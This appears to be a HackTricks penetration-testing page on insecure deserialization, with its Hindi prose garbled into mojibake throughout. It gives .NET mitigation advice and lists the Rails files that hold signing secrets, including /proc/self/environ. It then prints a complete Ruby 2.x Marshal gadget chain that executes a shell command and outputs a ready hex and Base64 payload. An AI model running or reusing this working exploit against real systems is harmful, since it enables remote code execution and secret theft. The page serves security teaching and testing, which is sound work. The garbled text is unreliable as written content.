[**рдЗрд╕ рдкреЛрд╕реНрдЯ рдХреЛ рджреЗрдЦреЗрдВ рдЬреЛ .Net рдХреЗ \_\_ViewState рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рдЕрдкрдирд╛рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддреА рд╣реИ**](exploiting-\_\_viewstate-parameter.md) рддрд╛рдХрд┐ **рд╡рд┐рдЪрд╛рд░рд╢реАрд▓ рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ**ред рдпрджрд┐ рдЖрдк **рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдкреАрдбрд╝рд┐рдд рдорд╢реАрди рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рд░рд╣рд╕реНрдп** рдХреЛ рдЬрд╛рдирддреЗ рд╣реИрдВ, рддреЛ [**рдЗрд╕ рдкреЛрд╕реНрдЯ рдХреЛ рдкрдврд╝реЗрдВ рддрд╛рдХрд┐ рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдиреЗрдВ**](exploiting-\_\_viewstate-knowing-the-secret.md)**ред**

### **рд░реЛрдХрдерд╛рдо**

рдбреЗрдЯрд╛рд╕реНрдЯреНрд░реАрдо рдХреЛ рдирд╣реАрдВ рджреЗрдВ рдХрд┐ рд╕реНрдЯреНрд░реАрдо рдХреЛ рдХрд┐рд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ рдСрдмреНрдЬреЗрдХреНрдЯ рдореЗрдВ рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рдЖрдк рдЗрд╕реЗ рд░реЛрдХ рд╕рдХрддреЗ рд╣реИрдВ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП `DataContractSerializer` рдпрд╛ `XmlSerializer` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗред

рдЬрд╣рд╛рдВ `JSON.Net` рдХрд╛ рдЙрдкрдпреЛрдЧ рд╣реЛ рд░рд╣рд╛ рд╣реЛ, рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ `TypeNameHandling` рдХреЗрд╡рд▓ `None` рдкрд░ рд╕реЗрдЯ рд╣реЛред
```
TypeNameHandling = TypeNameHandling.None
```
рдпрджрд┐ `JavaScriptSerializer` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рд╣реЛ рддреЛ рдЗрд╕реЗ `JavaScriptTypeResolver` рдХреЗ рд╕рд╛рде рди рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред

рдпрджрд┐ рдЖрдкрдХреЛ рдбреЗрдЯрд╛ рд╕реНрдЯреНрд░реАрдо рдХреЛ рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд░рдирд╛ рд╣реЛ рдЬреЛ рдЕрдкрдиреЗ рдЦреБрдж рдХреЗ рдЯрд╛рдЗрдк рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддреА рд╣реИ, рддреЛ рдЙрди рдЯрд╛рдЗрдк рдХреЛ рд╕реАрдорд┐рдд рдХрд░реЗрдВ рдЬреЛ рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕реЗ рдЕрд╡рд╢реНрдп рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ рдлрд┐рд░ рднреА рдЬреЛрдЦрд┐рдордкреВрд░реНрдг рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдХрдИ рдореВрд▓ .Net рдЯрд╛рдЗрдк рд╕реНрд╡рддрдГ рдореЗрдВ рд╕рдВрднрд╡рддрдГ рдЦрддрд░рдирд╛рдХ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред рдЙрджрд╛.
```
System.IO.FileInfo
```
`FileInfo` рдСрдмреНрдЬреЗрдХреНрдЯ рдЬреЛ рд╕рд░реНрд╡рд░ рдкрд░ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХрд╛ рд╕рдВрджрд░реНрдн рдХрд░рддреЗ рд╣реИрдВ, рдЬрдм рд╡реЗ рдбреАрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ, рддреЛ рдЙрди рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреА рдЧреБрдгрд╡рддреНрддрд╛ рдХреЛ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ рдХрд┐ рдХреЗрд╡рд▓ рдкрдврд╝рдиреЗ рдпреЛрдЧреНрдп, рдЬреЛ рдПрдХ рдкреЛрдЯреЗрдВрд╢рд┐рдпрд▓ рдбрд┐рдирд╛рдпрд▓ рдСрдл рд╕рд░реНрд╡рд┐рд╕ рд╣рдорд▓рд╛ рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИред

рдпрджрд┐ рдЖрдкрдиреЗ рдбреАрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реАрдорд┐рдд рдЯрд╛рдЗрдк рдХрд┐рдП рд╣реИрдВ, рддреЛ рднреА рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдХреБрдЫ рдЯрд╛рдЗрдк рдХреЗ рд░рд┐рд╕реНрдХреА рдкреНрд░реЙрдкрд░реНрдЯреАрдЬрд╝ рд╣реЛ рд╕рдХрддреА рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, `System.ComponentModel.DataAnnotations.ValidationException` рдПрдХ `Object` рдЯрд╛рдЗрдк рдХреА `Value` рдкреНрд░реЙрдкрд░реНрдЯреА рд╣реЛрддреА рд╣реИред рдпрджрд┐ рдЗрд╕ рдЯрд╛рдЗрдк рдХреЛ рдбреАрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреБрдорддрд┐ рджреА рдЧрдИ рд╣реИ, рддреЛ рд╣рдорд▓рд╛рд╡рд░ рд╡рд╛рдкрд╕реА рдкреНрд░реЙрдкрд░реНрдЯреА `Value` рдХреЛ рдХрд┐рд╕реА рднреА рдСрдмреНрдЬреЗрдХреНрдЯ рдЯрд╛рдЗрдк рдкрд░ рд╕реЗрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рд╣рдорд▓рд╛рд╡рд░реЛрдВ рдХреЛ рдЯрд╛рдЗрдк рдХреЛ рдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред рдпрджрд┐ рдпрд╣ рд╕рдВрднрд╡ рд╣реИ, рддреЛ рдбреЗрдЯрд╛рдХрдВрдЯреНрд░реИрдХреНрдЯрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝рд░ рдпрд╛ рдПрдХреНрд╕рдПрдорд▓рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝рд░ рднреА рдЕрд╡рд░реБрджреНрдз рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдПред
```
// Action below is dangerous if the attacker can change the data in the database
var typename = GetTransactionTypeFromDatabase();

var serializer = new DataContractJsonSerializer(Type.GetType(typename));

var obj = serializer.ReadObject(ms);
```
рдирд┐рд╖реНрдкрд╛рджрди рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдХреЗ рджреМрд░рд╛рди рдХреБрдЫ .Net рдкреНрд░рдХрд╛рд░реЛрдВ рдореЗрдВ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рдиреАрдЪреЗ рджрд┐рдЦрд╛рдП рдЧрдП рддрд░рд╣ рдХрд╛ рдирд┐рдпрдВрддреНрд░рдг рдмрдирд╛рдирд╛ рдЕрдкреНрд░рднрд╛рд╡реА рд╣реИред
```
var suspectObject = myBinaryFormatter.Deserialize(untrustedData);

//Check below is too late! Execution may have already occurred.
if (suspectObject is SomeDangerousObjectType)
{
//generate warnings and dispose of suspectObject
}
```
`BinaryFormatter` рдФрд░ `JSON.Net` рдХреЗ рд▓рд┐рдП рдПрдХ рд╕реБрд░рдХреНрд╖рд┐рдд рд╡реНрд╣рд╛рдЗрдЯрд▓рд┐рд╕реНрдЯ рдирд┐рдпрдВрддреНрд░рдг рдХрд╛ рдирд┐рд░реНрдорд╛рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдХрд╕реНрдЯрдо `SerializationBinder` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рд╕реБрд░рдХреНрд╖рд┐рдд рд░реВрдк рдмрдирд╛рдирд╛ рд╕рдВрднрд╡ рд╣реИред

рдЬреНрдЮрд╛рдд .Net рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдЧреИрдЬреЗрдЯреНрд╕ рдкрд░ рдЕрджреНрдпрддрд┐рдд рд░рд╣рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ рдФрд░ рдЦрд╛рд╕ рдзреНрдпрд╛рди рджреЗрдВ рдЬрд╣рд╛рдВ рдРрд╕реЗ рдкреНрд░рдХрд╛рд░ рдХреЗ рдЯрд╛рдЗрдк рдЖрдкрдХреЗ рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред **рдПрдХ рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝рд░ рдХреЗрд╡рд▓ рдЙрди рдЯрд╛рдЗрдкреНрд╕ рдХреЛ рдирд┐рд░реНрдорд╛рдг рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рдирдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЙрд╕реЗ рдкрддрд╛ рд╣реЛрддрд╛ рд╣реИ**ред

рдХрд┐рд╕реА рднреА рдХреЛрдб рдХреЛ рдЕрд▓рдЧ рд░рдЦрдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ рдЬреЛ рд╕рдВрднрд╛рд╡рд┐рдд рдЧреИрдЬреЗрдЯреНрд╕ рдХреЛ рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЬрд┐рд╕рдореЗрдВ рдЗрдВрдЯрд░рдиреЗрдЯ рдХрдиреЗрдХреНрдЯрд┐рд╡рд┐рдЯреА рд╣реЛ рд╕рдХрддреА рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд░реВрдк рдореЗрдВ, WPF рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ `System.Windows.Data.ObjectDataProvider` рдПрдХ рдЬреНрдЮрд╛рдд рдЧреИрдЬреЗрдЯ рд╣реИ рдЬреЛ рд╡рд┐рдЪрд╛рд░рд╣реАрди рдбреЗрдЯрд╛ рдХреЛ рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдПрдХ REST рд╕реЗрд╡рд╛ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдореЗрдВ рдЗрд╕ рдПрд╕реЗрдВрдмрд▓реА рдХрд╛ рд╕рдВрджрд░реНрдн рд░рдЦрдирд╛ рдЬреЛрдЦрд┐рдордкреВрд░реНрдг рд╣реЛрдЧрд╛ред

### **рд╕рдВрджрд░реНрдн**

* рдЬрд╛рд╡рд╛ рдФрд░ .Net JSON рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди **рдкреЗрдкрд░:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** рдЯреЙрдХ: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) рдФрд░ рд╕реНрд▓рд╛рдЗрдбреНрд╕: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp)
* [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf)
* [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **рд░реВрдмреА**

рд░реВрдмреА рдореЗрдВ рд╕реАрд░реАрдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдХреЛ рд▓рд╛рдЧреВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдорд╛рд░реНрд╢рд▓** рдкреБрд╕реНрддрдХрд╛рд▓рдп рдореЗрдВ рджреЛ рд╡рд┐рдзрд┐рдпрд╛рдБ рд╣реИрдВ: рдкрд╣рд▓реА рд╡рд┐рдзрд┐ рд╣реИ **рдбрдВрдк** рдЬреЛ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ рдмрд╛рдЗрдЯ рд╕реНрдЯреНрд░реАрдо рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрд┐рдд рдХрд░рддреА рд╣реИ **(рд╕реАрд░реАрдпрд▓рд╛рдЗрдЬрд╝ рдХрд░рддреА рд╣реИ)**ред рдФрд░ рджреВрд╕рд░реА рд╡рд┐рдзрд┐ рд╣реИ **рд▓реЛрдб** рдЬреЛ рдмрд╛рдЗрдЯ рд╕реНрдЯреНрд░реАрдо рдХреЛ рдлрд┐рд░ рд╕реЗ рдСрдмреНрдЬреЗрдХреНрдЯ рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрд┐рдд рдХрд░рддреА рд╣реИ (**рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд░рддреА рд╣реИ**)ред\
рд░реВрдмреА HMAC рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╕реАрд░реАрдпрд▓рд╛рдЗрдЬрд╝ рдХрд┐рдП рдЧрдП рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ рд╕рд╛рдЗрди рдХрд░реЗрдВ рдФрд░ рдХреБрдВрдЬреА рдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдлрд╝рд╛рдЗрд▓реЛрдВ рдореЗрдВ рд╕рд╣реЗрдЬреЗрдВ:

* config/environment.rb
* config/initializers/secret\_token.rb
* config/secrets.yml
* /proc/self/environ

рд░реВрдмреА 2.X рдЬреЗрдиреЗрд░рд┐рдХ рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рд╕реЗ RCE рдЧреИрдЬреЗрдЯ рдЪреЗрди (рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [https://www.elttam.com/blog/ruby-deserialization/](https://www.elttam.com/blog/ruby-deserialization/) рджреЗрдЦреЗрдВ):
```ruby
#!/usr/bin/env ruby

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
Ruby On Rails рдХреЛ рдЕрдиреБрд╢рд╛рд╕рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреНрдп RCE рдЪреЗрди: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЗрдЪреНрдЫрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **Twitter** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ PRs рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ**.

</details>
